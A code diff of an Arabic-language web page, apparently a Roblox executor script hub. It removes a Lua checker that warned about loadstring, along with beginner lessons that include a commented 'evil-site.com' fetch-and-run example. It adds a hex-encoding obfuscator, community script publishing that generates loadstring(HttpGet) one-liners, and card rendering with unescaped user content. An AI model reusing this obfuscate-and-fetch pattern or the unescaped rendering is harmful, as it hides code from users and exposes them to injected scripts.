-  const re = /\b(if|then|elseif|else|end|for|while|do|repeat|until|function|return|local|break|and|or|not|in|nil|true|false)\b/g;
-  let m;
-  while ((m = re.exec(clean)) !== null){
-    tokens.push({ kw: m[1], pos: m.index });
-  }
-
-  // 1. Block balance
-  const stack = [];
-  for (const t of tokens){
-    const ln = lineOf(t.pos);
-    if (t.kw === 'if') stack.push({type:'if', line: ln});
-    else if (t.kw === 'function') stack.push({type:'function', line: ln});
-    else if (t.kw === 'for') stack.push({type:'for', line: ln});
-    else if (t.kw === 'while') stack.push({type:'while', line: ln});
-    else if (t.kw === 'repeat') stack.push({type:'repeat', line: ln});
-    else if (t.kw === 'end'){
-      if (!stack.length) errors.push(`سطر ${ln}: "end" زيادة، مفيش بلوك مفتوح يقفلها.`);
-      else {
-        const top = stack.pop();
-        if (top.type === 'repeat') errors.push(`سطر ${ln}: "end" غلط — الـ "repeat" اللي في سطر ${top.line} بيتقفل بـ "until" مش "end".`);
+  // ====== أداة التمويه ======
+  window.obfuscateCode = () => {
+      const plain = document.getElementById('plainCode').value;
+      if(!plain) return alert("اكتب الكود الأول!");
+      
+      const utf8 = new TextEncoder().encode(plain);
+      const chunks = new Array(utf8.length);
+      
+      for (let i = 0; i < utf8.length; i++) {
+          chunks[i] = "\\x" + utf8[i].toString(16).padStart(2, '0');
       }
-    } else if (t.kw === 'until'){
-      if (!stack.length) errors.push(`سطر ${ln}: "until" بدون "repeat".`);
-      else {
-        const top = stack.pop();
-        if (top.type !== 'repeat') errors.push(`سطر ${ln}: "until" بدون "repeat" مطابق — فيه "${top.type}" مفتوح في سطر ${top.line}.`);
+      
+      const obfuscated = `loadstring("${chunks.join('')}")()`;
+      document.getElementById('encryptedCode').value = obfuscated;
+  };
+
+  // ====== تشغيل صفحة السكريبت (Raw) ======
+  if (new URLSearchParams(window.location.search).has('raw')) {
+      document.body.innerHTML = '<div style="color:#0f0;font-family:monospace;padding:20px;font-size:20px;">[Delta] Loading script...</div>';
+      setTimeout(() => {
+          try {
+              const code = window.decodeCode(new URLSearchParams(window.location.search).get('raw'));
+              document.body.innerHTML = '<pre>' + code.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;") + '</pre>';
+              document.body.className = 'raw-view';
+          } catch(e) { document.body.innerHTML = 'Error'; }
+      }, 600);
+  }
+
+  // ====== إنشاء حساب ======
+  window.doRegister = async () => {
+      const username = document.getElementById('regUser').value.trim();
+      const password = document.getElementById('regPass').value;
+      if(!username || !password) return window.showError("املا كل الخانات!");
+      if(password.length < 6) return window.showError("كلمة السر لازم 6 حروف على الأقل!");
+
+      try {
+          const q = query(collection(db, "users"), where("username", "==", username));
+          const snap = await getDocs(q);
+          if (!snap.empty) return window.showError("⚠️ الاسم ده متاخد! اختار اسم تاني.");
+
+          const fakeEmail = username.toLowerCase() + "@delta-hub.com";
+          const userCredential = await createUserWithEmailAndPassword(auth, fakeEmail, password);
+          await addDoc(collection(db, "users"), { uid: userCredential.user.uid, username: username });
+      } catch (error) { window.showError("خطأ: " + error.message); }
+  };
+
+  // ====== تسجيل الدخول ======
+  window.doLogin = async () => {
+      const username = document.getElementById('loginUser').value.trim();
+      const password = document.getElementById('loginPass').value;
+      if(!username || !password) return window.showError("املا كل الخانات!");
+
+      try {
+          const fakeEmail = username.toLowerCase() + "@delta-hub.com";
+          await signInWithEmailAndPassword(auth, fakeEmail, password);
+      } catch (error) {
+          if (error.code === 'auth/wrong-password' || error.code === 'auth/user-not-found' || error.code === 'auth/invalid-credential') {
+              window.showError("❌ الاسم أو كلمة السر غلط!");
+          } else { window.showError("خطأ: " + error.message); }
       }
-    }
-  }
-  for (const s of stack){
-    if (s.type === 'repeat') errors.push(`سطر ${s.line}: "repeat" مفتوح — محتاج "until" يقفله.`);
-    else errors.push(`سطر ${s.line}: "${s.type}" مفتوح — محتاج "end" يقفله.`);
-  }
+  };
 
-  // 2. Bracket balance
-  const bstack = [];
-  const pairs = {')':'(', '}':'{', ']':'['};
-  for (let i = 0; i < clean.length; i++){
-    const c = clean[i];
-    if (c === '(' || c === '{' || c === '[') bstack.push({c, i});
-    else if (c === ')' || c === '}' || c === ']'){
-      if (!bstack.length || bstack[bstack.length-1].c !== pairs[c])
-        errors.push(`سطر ${lineOf(i)}: "${c}" مش متطابق مع أي قوس مفتوح.`);
-      else bstack.pop();
-    }
-  }
-  for (const s of bstack){
-    const closing = Object.keys(pairs).find(k => pairs[k] === s.c);
-    errors.push(`سطر ${lineOf(s.i)}: "${s.c}" مفتوح — محتاج "${closing}".`);
-  }
+  window.doLogout = () => signOut(auth);
 
-  // 3. Warnings
-  if (/\bwait\s*\(/.test(clean) && !/task\.wait/.test(clean)){
-    warnings.push('"wait()" قديمة — استخدم "task.wait()" بدالها (أدق ومستقرة).');
-  }
-  if (/while\s+true\s+do/.test(clean) && !/task\.wait|RunService|:Wait\s*\(/.test(clean)){
-    warnings.push('"while true do" بدون "task.wait()" — هتعلّق اللعبة. حط wait جوه الحلقة.');
-  }
-  if (/loadstring\s*\(/.test(clean)){
-    warnings.push('"loadstring" بتشغّل كود من نص — لو النص جاي من الإنترنت، ده خطر أمني كبير. اتأكد من المصدر.');
-  }
-  if (/\b(getfenv|setfenv)\s*\(/.test(clean)){
-    warnings.push('"getfenv/setfenv" متقدمة وخطيرة — حاول تتجنبها.');
-  }
-  if (/require\s*\(\s*\d+\s*\)/.test(clean)){
-    warnings.push('"require(رقم)" بيحمّل موديل من ID — تأكد إن الـ ID موثوق.');
-  }
-  if (/\b(_G|shared)\b/.test(clean)){
-    warnings.push('استخدام "_G" أو "shared" مش محبب — بيعمل تعارض مع سكريبتات تانية.');
-  }
-  if (/\.Character\b/.test(clean) && !/:WaitForChild\(\s*["']Character/.test(clean)){
-    infos.push('تأكد إن "Character" مش nil — استخدم ":WaitForChild()" أو ":FindFirstChild()" قبل الاستخدام.');
-  }
-  if (/\.Humanoid\b/.test(clean) && !/:WaitForChild\(\s*["']Humanoid/.test(clean)){
-    infos.push('"Humanoid" ممكن تكون nil لحظة تحميل الشخصية — استخدم ":WaitForChild()".');
-  }
-  if (/\bprint\s*\(/.test(clean)){
-    infos.push('في "print" — كويس للتصحيح، بس شيله قبل ما تنشر السكريبت.');
-  }
+  // ====== متابعة حالة المستخدم ======
+  onAuthStateChanged(auth, async (user) => {
+      if (user) {
+          currentUser = user;
+          const q = query(collection(db, "users"), where("uid", "==", user.uid));
+          const snap = await getDocs(q);
+          if(!snap.empty) {
+              currentUsername = snap.docs[0].data().username;
+              document.getElementById('userDisplay').textContent = '👤 ' + currentUsername;
+              document.getElementById('authScreen').classList.add('hidden');
+              document.querySelector('.wrap').style.display = 'block';
+              loadScripts();
+          }
+      } else {
+          currentUser = null; currentUsername = "";
+          document.getElementById('authScreen').classList.remove('hidden');
+          document.querySelector('.wrap').style.display = 'none';
+      }
+  });
 
-  // 4. Suggestions (general)
-  const codeLines = rawCode.split('\n').length;
-  infos.push(`عدد الأسطر: ${codeLines}`);
-
-  return { errors, warnings, infos };
-}
-
-/* ===== Render checker results ===== */
-function renderCheckResults(res){
-  const box = $('#checkResult');
-  box.innerHTML = '';
-  if (res.errors.length){
-    const d = document.createElement('div');
-    d.className = 'result-card err';
-    d.innerHTML = `<h4>❌ أخطاء (${res.errors.length})</h4><ul>${res.errors.map(e=>`<li>${esc(e)}</li>`).join('')}</ul>`;
-    box.appendChild(d);
-  }
-  if (res.warnings.length){
-    const d = document.createElement('div');
-    d.className = 'result-card warn';
-    d.innerHTML = `<h4>⚠️ تحذيرات (${res.warnings.length})</h4><ul>${res.warnings.map(e=>`<li>${esc(e)}</li>`).join('')}</ul>`;
-    box.appendChild(d);
-  }
-  if (res.infos.length){
-    const d = document.createElement('div');
-    d.className = 'result-card';
-    d.innerHTML = `<h4>💡 ملاحظات</h4><ul>${res.infos.map(e=>`<li>${esc(e)}</li>`).join('')}</ul>`;
-    box.appendChild(d);
-  }
-  if (!res.errors.length && !res.warnings.length){
-    const d = document.createElement('div');
-    d.className = 'result-card ok';
-    d.innerHTML = `<h4>✅ الكود سليم مبدئيًا</h4><p style="margin:0">مفيش أخطاء في البلوكات أو الأقواس، ومفيش تحذيرات أمان. لسه محتاج تجربه فعليًا في Roblox Studio عشان تتأكد إنه بيشتغل صح.</p>`;
-    box.appendChild(d);
-  }
-}
-
-$('#checkBtn').addEventListener('click', () => {
-  const code = $('#codeInput').value;
-  renderCheckResults(checkLua(code));
-});
-$('#clearBtn').addEventListener('click', () => {
-  $('#codeInput').value = '';
-  $('#checkResult').innerHTML = '';
-});
-
-/* ===== Samples for checker ===== */
-const SAMPLES = [
-  { name:'✅ كود سليم', code:`local Players = game:GetService("Players")
-local player = Players.LocalPlayer
-
-if player then
-    print("أهلاً:", player.Name)
-end` },
-  { name:'❌ ناقص end', code:`local x = 5
-if x > 3 then
-    print("كبير")` },
-  { name:'⚠️ حلقة معلّقة', code:`while true do
-    print("هعلق اللعبة")
-end` },
-  { name:'⚠️ loadstring خطير', code:`loadstring(game:HttpGet("https://example.com/script.lua"))()` },
-  { name:'❌ قوس مش متطابق', code:`local x = (5 + 3
-print(x)` }
-];
-$('#samples').innerHTML = SAMPLES.map((s, i) =>
-  `<button class="btn ghost" data-sample="${i}">${esc(s.name)}</button>`
-).join('');
-$('#samples').addEventListener('click', e => {
-  const b = e.target.closest('[data-sample]');
-  if (!b) return;
-  const s = SAMPLES[Number(b.dataset.sample)];
-  $('#codeInput').value = s.code;
-  renderCheckResults(checkLua(s.code));
-});
-
-/* ===== Lessons Data ===== */
-const LESSONS = [
-  {
-    id:'l1', title:'إيه هو Luau وليه روبلوكس بتستخدمه؟',
-    intro:'Luau هي نسخة مطورة من Lua، عملتها شركة Roblox عشان تكون أسرع وأأمن. أي كود بتكتبه لروبلوكس لازم يكون بـ Luau.',
-    code:`-- أي كود في روبلوكس بيبدأ بـ print
--- print بتطبع أي حاجة في Output
-
-print("أهلاً بالعالم من دلتا!")
-print("1 + 1 =", 1 + 1)`,
-    tips:[
-      'Luau متوافقة مع Lua 5.1 + تحسينات في السرعة والأنواع.',
-      'الـ Output هو المكان اللي بتشوف فيه الـ print والأخطاء.',
-      'التعليق بـ -- على سطر، أو --[[ ... ]] لأكتر من سطر.'
-    ]
-  },
-  {
-    id:'l2', title:'المتغيرات: أول خطوة في أي برنامج',
-    intro:'المتغير خانة في الذاكرة بتحفظ قيمة (نص، رقم، صح/غلط). الكلمة السحرية local بتخليه محلي في النطاق.',
-    code:`-- local = المتغير محلي في النطاق الحالي
-local name = "أحمد"     -- نص (string)
-local age = 25          -- رقم (number)
-local isStudent = true  -- صح/غلط (boolean)
-
--- تقدر تغير القيمة
-age = age + 1
-print(age)  -- 26
-
--- لو شلت local، المتغير بيبقى global
--- وده بيسبب تعارضات مع سكريبتات تانية`,
-    tips:[
-      'استخدم local دايمًا — ده أفضل ممارسة.',
-      'لو دوست local جوه دالة، المتغير ميتشافش برا الدالة.',
-      'الأسماء بحروف صغيرة وكبيرة بتختلف: Name ≠ name.'
-    ]
-  },
-  {
-    id:'l3', title:'الشروط: if / elseif / else',
-    intro:'الشروط بتخلي البرنامج يقرر. لو الشرط اتحقق → نفذ البلوك اللي جواه.',
-    code:`local score = 85
-
-if score >= 90 then
-    print("ممتاز")
-elseif score >= 70 then
-    print("جيد")
-elseif score >= 50 then
-    print("مقبول")
-else
-    print("راسب")
-end
--- النتيجة: جيد`,
-    tips:[
-      'كل if لازم يتقفل بـ end.',
-      'elseif بيتنفذ بس لو كل الشروط اللي قبله فشلت.',
-      'حط أقوى شرط الأول — الترتيب بيفرق.'
-    ]
-  },
-  {
-    id:'l4', title:'الحلقات: for و while',
-    intro:'الحلقة بتكرر كود أكتر من مرة. ⚠️ الحلقة اللي ملهاش task.wait() هتعلّق اللعبة!',
-    code:`-- for: بتمر على نطاق أرقام
-for i = 1, 5 do
-    print("العدد:", i)
-end
-
--- while: بلف طول ما الشرط صح
-local counter = 0
-while counter < 3 do
-    counter = counter + 1
-    print("لفة:", counter)
-    task.wait(1)  -- ⚠️ مهم! من غيرها اللعبة بتعلّق
-end
-
--- for in: بتمر على عناصر جدول
-local names = {"أحمد", "سارة", "محمد"}
-for index, name in ipairs(names) do
-    print(index, name)
-end`,
-    tips:[
-      'دايمًا حط task.wait() جوه أي while true do.',
-      'استخدم for لو عارف عدد اللفات، while لو مش عارف.',
-      'ipairs للـ array، pairs للـ dictionary.'
-    ]
-  },
-  {
-    id:'l5', title:'الدوال: كود بيعيد استخدام نفسه',
-    intro:'الدالة كتلة كود بتحط عليها اسم، وتقدر تناديها في أي وقت من أي مكان.',
-    code:`-- دالة بسيطة بترجع Nothing
-local function greet(name)
-    print("أهلاً يا " .. name .. "!")
-end
-
-greet("أحمد")  -- أهلاً يا أحمد!
-
--- دالة بترجع قيمة
-local function add(a, b)
-    return a + b
-end
-
-local result = add(3, 5)
-print(result)  -- 8`,
-    tips:[
-      'الـ ".." في لوا بتربط النصوص (concatenation).',
-      'الدالة اللي بترجع قيمة لازم يكون فيها return.',
-      'ممكن تمرر دالة كـ argument لدالة تانية (مهم للأحداث).'
-    ]
-  },
-  {
-    id:'l6', title:'الجداول: قلب لوا',
-    intro:'الجدول (table) هو كل حاجة في لوا — array، dictionary، object، وكل جزء في اللعبة عبارة عن table.',
-    code:`-- Array (مصفوفة): عناصر مرقمة من 1
-local fruits = {"تفاح", "موز", "برتقال"}
-print(fruits[1])  -- تفاح
-print(#fruits)    -- 3 (الطول)
-
--- Dictionary (قاموس): مفاتيح وأسماء
-local player = {
-    name = "أحمد",
-    level = 5,
-    hp = 100
-}
-print(player.name)   -- أحمد
-print(player.level)  -- 5
-
--- تقدر تعدل
-player.hp = 80
-print(player.hp)  -- 80`,
-    tips:[
-      '⚠️ لوا بتبدأ العد من 1 مش من 0.',
-      'الـ # بترجع طول الـ array.',
-      'ممكن تحط جداول جوه جداول (nested tables).'
-    ]
-  },
-  {
-    id:'l7', title:'game و Services',
-    intro:'game هو كل اللعبة. Services هي أدوات جوه اللعبة (Players، RunService، TweenService...).',
-    code:`-- خدمات شائعة
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local TweenService = game:GetService("TweenService")
-
--- اللاعب المحلي (بتاعك إنت)
-local LocalPlayer = Players.LocalPlayer
-print("أنا:", LocalPlayer.Name)
-
--- كل اللاعبين الحاليين
-for _, player in ipairs(Players:GetPlayers()) do
-    print(player.Name)
-end`,
-    tips:[
-      'استخدم :GetService() دايمًا — أأمن من game.Players.',
-      'workspace بترجع الـ Workspace service على طول.',
-      'جيب الـ Services في أول السكريبت.'
-    ]
-  },
-  {
-    id:'l8', title:'الشخصية والـ Humanoid',
-    intro:'كل لاعب ليه Character، وجواه Humanoid بيتحكم في الحركة والصحة.',
-    code:`local Players = game:GetService("Players")
-local LP = Players.LocalPlayer
-
--- استنى الشخصية تتحمل (مهم!)
-local character = LP.Character or LP.CharacterAdded:Wait()
-local humanoid = character:WaitForChild("Humanoid")
-
-print("صحة اللاعب:", humanoid.Health)
-
--- غير سرعة المشي
-humanoid.WalkSpeed = 50
-
--- غير قوة النط
-humanoid.JumpPower = 100
-
--- غير الجاذبية (تقدر تطير 😄)
-workspace.Gravity = 50`,
-    tips:[
-      'دايمًا استخدم :WaitForChild() بدل ما تاخد الحاجة على طول.',
-      'Character ممكن تكون nil لحظة الدخول.',
-      'Humanoid.Health لو وصلت 0، اللاعب بيموت.'
-    ]
-  },
-  {
-    id:'l9', title:'الأحداث: خلي الكود يتفاعل',
-    intro:'الأحداث (Events) بتنادي دالة لما يحصل حاجة — لمس، تغيير، دخول لاعب...',
-    code:`local part = workspace:WaitForChild("PartName")
-
--- لما حد يلمس الجزء
-part.Touched:Connect(function(hit)
-    local humanoid = hit.Parent:FindFirstChild("Humanoid")
-    if humanoid then
-        print("حد لمس الجزء!")
-        humanoid.Health = 0
-    end
-end)
-
--- لما خاصية تتغير
-part.Changed:Connect(function(property)
-    print("اتغير:", property)
-end)
-
--- لما لاعب يدخل اللعبة
-game.Players.PlayerAdded:Connect(function(player)
-    print("لاعب جديد:", player.Name)
-end)`,
-    tips:[
-      ':Connect() بتربط الدالة بالحدث.',
-      'ممكن تفصل الحدث بـ :Disconnect() بعدين.',
-      'الأحداث بتشتغل في thread مستقلة.'
-    ]
-  },
-  {
-    id:'l10', title:'حماية الكود: pcall',
-    intro:'الأخطاء بتحصل. pcall بتشتغل الكود بأمان وترجعلك (نجح؟ / إيه اللي حصل؟).',
-    code:`-- pcall بتشتغل دالة، لو فيها خطأ مش هتكسر السكريبت
-local success, result = pcall(function()
-    local x = 10 / 0
-    return x
-end)
-
-if success then
-    print("النتيجة:", result)
-else
-    print("فيه خطأ:", result)
-end
-
--- مثال حقيقي: محاولة الوصول لحاجة مش موجودة
-local ok = pcall(function()
-    return workspace.NonExistent.Part
-end)
-print(ok)  -- false`,
-    tips:[
-      'استخدم pcall في أي كود مش متأكد منه.',
-      'pcall بترجع (success, result_or_error).',
-      'مهمة جدًا في السكريبتات اللي بتستقبل input من المستخدم.'
-    ]
-  },
-  {
-    id:'l11', title:'الأمان: loadstring ومتى تتجنبها',
-    intro:'في دوال خطيرة لو استخدمتها غلط، ممكن حد يخترق حسابك أو يسرق لعبتك.',
-    code:`-- ✅ آمن: loadstring على كود إنت كاتبه
-local safeCode = "print('أهلاً من دلتا')"
-local func = loadstring(safeCode)
-if func then
-    func()  -- أهلاً من دلتا
-end
-
--- ❌ خطر: loadstring على كود من الإنترنت
--- loadstring(game:HttpGet("https://evil-site.com/hack.lua"))()
--- ده ممكن يسرقك أو يبوّظ اللعبة
-
--- ❌ خطر: استخدام _G أو shared
--- _G.myValue = 5  -- ممكن يتعارض مع سكريبتات تانية
-
--- ✅ الأفضل: local
-local myValue = 5`,
-    tips:[
-      'loadstring مسموحة في الـ executor، مش في Scripts العادية.',
-      'شغّل بس كود إنت فاهمه أو من مصدر موثوق.',
-      'متستخدمش _G أو shared في سكريبتات كبيرة.',
-      'لو بتستخدم سكريبت من حد تاني، اقرأه الأول!'
-    ]
-  },
-  {
-    id:'l12', title:'LocalScript vs Script',
-    intro:'في نوعين سكريبت في روبلوكس. واحد بيشتغل على جهاز اللاعب، والتاني على السيرفر.',
-    code:`-- LocalScript (بيشتغل على جهاز اللاعب)
--- مكانه: StarterPlayer > StarterPlayerScripts
--- أو: StarterGui
-local Players = game:GetService("Players")
-print("أنا:", Players.LocalPlayer.Name)
-
--- Script (بيشتغل على السيرفر)
--- مكانه: ServerScriptService
-game.Players.PlayerAdded:Connect(function(player)
-    print("لاعب جديد:", player.Name)
-    player.CharacterAdded:Connect(function(character)
-        character:WaitForChild("Humanoid").WalkSpeed = 30
-    end)
-end)`,
-    tips:[
-      'LocalScript بيغير حاجات على جهازك بس (زي UI).',
-      'Script بيغير حاجات على السيرفر (زي صحة اللاعبين).',
-      'متستخدمش LocalScript عشان تغير حاجة مهمة — اللاعب يقدر يغش.'
-    ]
-  }
-];
-
-/* ===== Render lessons ===== */
-const done = new Set(store.get('done', []));
-const lessonList = $('#lessonList');
-
-function renderLessons(){
-  lessonList.innerHTML = LESSONS.map((l, i) => `
-    <div class="lesson${done.has(l.id) ? ' done' : ''}" data-id="${l.id}">
-      <button class="lesson-h" type="button">
-        <span class="num">${done.has(l.id) ? '✓' : String(i+1).padStart(2,'0')}</span>
-        <span class="t">${esc(l.title)}</span>
-        <span class="chev">›</span>
-      </button>
-      <div class="lesson-b">
-        <p>${esc(l.intro)}</p>
-        <div class="code-wrap">
-          <div class="code-head">
-            <span>lua</span>
-            <button class="btn sm ghost copy-btn" type="button">📋 نسخ</button>
-          </div>
-          <pre><code>${highlightLua(l.code)}</code></pre>
-        </div>
-        <h4 style="margin:12px 0 6px;font-size:14px">نقاط مهمة:</h4>
-        <ul>${l.tips.map(t => `<li>${esc(t)}</li>`).join('')}</ul>
-        <button class="btn sm ${done.has(l.id) ? 'ok' : 'primary'} done-btn" type="button" style="margin-top:10px">
-          ${done.has(l.id) ? '✓ تم إنجاز الدرس' : 'أكملت الدرس'}
-        </button>
-      </div>
-    </div>
-  `).join('');
-}
-
-lessonList.addEventListener('click', e => {
-  const head = e.target.closest('.lesson-h');
-  if (head){ head.parentElement.classList.toggle('open'); return; }
-  const copyBtn = e.target.closest('.copy-btn');
-  if (copyBtn){
-    const pre = copyBtn.closest('.code-wrap').querySelector('pre');
-    if (pre){
-      navigator.clipboard.writeText(pre.innerText).then(() => {
-        copyBtn.textContent = '✓ تم';
-        setTimeout(() => copyBtn.textContent = '📋 نسخ', 1500);
+  window.switchTab = (tab) => {
+      ['add', 'obf', 'my', 'comm'].forEach(t => {
+          document.getElementById('tab' + t.charAt(0).toUpperCase() + t.slice(1)).classList.add('hidden');
+          document.getElementById('nav' + t.charAt(0).toUpperCase() + t.slice(1)).classList.remove('active');
       });
-    }
-    return;
-  }
-  const doneBtn = e.target.closest('.done-btn');
-  if (doneBtn){
-    const card = doneBtn.closest('.lesson');
-    const id = card.dataset.id;
-    if (done.has(id)) done.delete(id); else done.add(id);
-    store.set('done', [...done]);
-    const wasOpen = card.classList.contains('open');
-    renderLessons();
-    const again = lessonList.querySelector(`.lesson[data-id="${id}"]`);
-    if (again && wasOpen) again.classList.add('open');
-  }
-});
+      const activeTab = document.getElementById('tab' + tab.charAt(0).toUpperCase() + tab.slice(1));
+      if(activeTab) activeTab.classList.remove('hidden');
+      document.getElementById('nav' + tab.charAt(0).toUpperCase() + tab.slice(1)).classList.add('active');
+  };
 
-renderLessons();
+  // ====== نشر السكريبت ======
+  window.saveScript = async () => {
+      const name = document.getElementById('scriptName').value.trim();
+      const cat = document.getElementById('scriptCategory').value;
+      const code = document.getElementById('scriptCode').value;
+      const imgData = document.getElementById('scriptImageData').value;
+      
+      if(!name || !code) return alert("اكتب الاسم والكود!");
 
-$('#year').textContent = new Date().getFullYear();
+      const btn = document.getElementById('saveBtn');
+      btn.textContent = "جاري النشر..."; btn.disabled = true;
+
+      try {
+          await addDoc(collection(db, "scripts"), {
+              name: name, 
+              category: cat, 
+              code: code, 
+              author: currentUsername,
+              uid: currentUser.uid, 
+              image: imgData || "", // لو مفيش صورة مرفوعة، هيفضل فاضي ونستخدم الصورة الافتراضية
+              createdAt: serverTimestamp()
+          });
+          document.getElementById('scriptName').value = '';
+          document.getElementById('scriptCode').value = '';
+          document.getElementById('scriptImage').value = '';
+          document.getElementById('scriptImageData').value = '';
+          document.getElementById('imagePreview').style.display = 'none';
+          
+          alert("تم النشر بنجاح!");
+          switchTab('my');
+      } catch(e) { alert("فشل النشر: " + e.message); }
+      finally { btn.textContent = "🚀 نشر السكريبت"; btn.disabled = false; }
+  };
+
+  function loadScripts() {
+      const q = query(collection(db, "scripts"), orderBy("createdAt", "desc"));
+      onSnapshot(q, (snapshot) => {
+          allScriptsCache = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
+          renderLists();
+      });
+  }
+
+  function renderLists() {
+      if(!currentUser) return;
+      const myList = document.getElementById('myList');
+      const commList = document.getElementById('communityList');
+      
+      const myScripts = allScriptsCache.filter(s => s.uid === currentUser.uid);
+      const commScripts = allScriptsCache.filter(s => s.uid !== currentUser.uid);
+
+      myList.innerHTML = myScripts.length ? myScripts.map(s => generateCard(s, true)).join('') : '<p style="color:var(--muted);text-align:center;">مفيش سكريبتات ليك.</p>';
+      commList.innerHTML = commScripts.length ? commScripts.map(s => generateCard(s, false)).join('') : '<p style="color:var(--muted);text-align:center;">المجتمع فاضي لسه.</p>';
+  }
+
+  function generateCard(s, isMine) {
+      const link = window.location.origin + window.location.pathname + '?raw=' + window.encodeCode(s.code);
+      const lua = `loadstring(game:HttpGet("${link}"))()`;
+      const displayImage = s.image ? s.image : getDefaultImage(s.category);
+      
+      return `
+      <div class="saved-item">
+        <img src="${displayImage}" class="saved-img" alt="${s.name}">
+        <div class="saved-content">
+            <div class="saved-header">
+              <div><span class="saved-title">${s.name}</span> <span class="badge">${s.category}</span></div>
+              ${isMine ? `<button class="btn sm" style="background:var(--bad);color:white;" onclick="deleteScript('${s.id}')">حذف</button>` : ''}
+            </div>
+            <div class="author">بواسطة: ${s.author}</div>
+            
+            <div class="flex-row" style="margin-top:12px;">
+                <input type="text" class="link-out" value="${lua}" readonly>
+                <button class="btn copy-btn" onclick="copyText('${lua}', this)">📋 نسخ</button>
+            </div>
+        </div>
+      </div>`;
+  }
+
+  window.deleteScript = async (id) => {
+      if(confirm('متأكد من الحذف؟')) await deleteDoc(doc(db, "scripts", id));
+  };
+
+  window.filterCommunity = () => {
+      const val = document.getElementById('searchInput').value.toLowerCase();
+      const commScripts = allScriptsCache.filter(s => s.uid !== currentUser.uid && (s.name.toLowerCase().includes(val) || s.category.toLowerCase().includes(val)));
+      document.getElementById('communityList').innerHTML = commScripts.length ? commScripts.map(s => generateCard(s, false)).join('') : '<p style="color:var(--muted);text-align:center;">مفيش نتائج.</p>';
+  };
+
+  window.copyText = (text, btn) => {
+      navigator.clipboard.writeText(text).then(() => {
+          btn.textContent = '✓'; btn.style.background = 'var(--ok)';
+          setTimeout(() => { btn.textContent = '📋 نسخ'; btn.style.background = ''; }, 1500);
+      });
+  };
 </script>
 </body>
 </html>
